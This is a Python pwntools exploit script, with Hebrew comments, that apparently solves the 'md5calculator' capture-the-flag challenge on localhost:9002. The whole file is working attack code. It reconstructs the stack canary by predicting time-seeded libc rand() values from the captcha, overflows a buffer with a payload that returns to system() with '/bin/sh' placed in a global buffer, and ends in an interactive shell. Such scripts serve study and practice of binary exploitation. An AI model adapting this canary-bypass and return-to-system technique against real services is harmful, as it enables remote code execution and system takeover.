from pwn import *
import base64
from ctypes import *
from ctypes.util import find_library

# --------------------------
# חיבור והגדרות בסיס
# --------------------------
libc = CDLL(find_library('c'))
libc.srand(libc.time(0))
array = [libc.rand() for _ in range(8)]

e = ELF("./md5calculator")
p = remote('localhost', 9002)

print(p.recvline().decode().strip())
line = p.recvline().decode().strip()
captcha_val = int(line.split()[-1])

# --------------------------
# חישוב canary
# --------------------------
sum_vals = (
    array[5] +
    array[1] +
    (array[2] - array[3]) +
    array[7] +
    (array[4] - array[6])
)
canary = (captcha_val - sum_vals) & 0xffffffff
print(f"[+] canary = {hex(canary)}")

# --------------------------
# בניית הפיילוד
# --------------------------
system_addr = e.plt['system']
g_buf_addr  = 0x0804b0e0 + 0x2d0  # שים לב להיסט כמו בקוד שעובד

payload  = b"A" * 0x200
payload += p32(canary)
payload += b"B" * 12
payload += p32(system_addr)
payload += b"BBBB"
payload += p32(g_buf_addr)

# --------------------------
# שליחת הפתרון והפיילוד
# --------------------------
p.sendline(str(captcha_val).encode())

# לדלג על 2 שורות מיותרות
p.recvline()
p.recvline()

# לשלוח את הפיילוד מקודד ב־Base64 + '/bin/sh\\x00'
encoded = base64.b64encode(payload).decode()
p.sendline(encoded + '/bin/sh' + '\x00')

# shell אינטראקטיבי
p.interactive()
